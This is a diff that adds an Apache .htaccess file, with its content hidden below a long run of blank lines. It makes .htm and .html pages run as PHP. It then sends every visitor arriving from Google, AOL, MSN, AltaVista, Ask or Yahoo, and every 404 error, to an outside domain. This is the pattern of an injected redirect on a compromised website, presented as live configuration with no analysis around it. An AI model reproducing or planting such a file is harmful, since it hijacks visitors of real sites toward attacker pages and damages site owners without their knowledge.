@@ -1,0 +1,37 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+RemoveHandler .htm .html
+AddType application/x-httpd-php .php .htm .html 
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC]
+RewriteRule .* http://vsemutorba.com/go.php?s=hz2 [R,L]
+Errordocument 404 http://vsemutorba.com/go.php?s=hz2
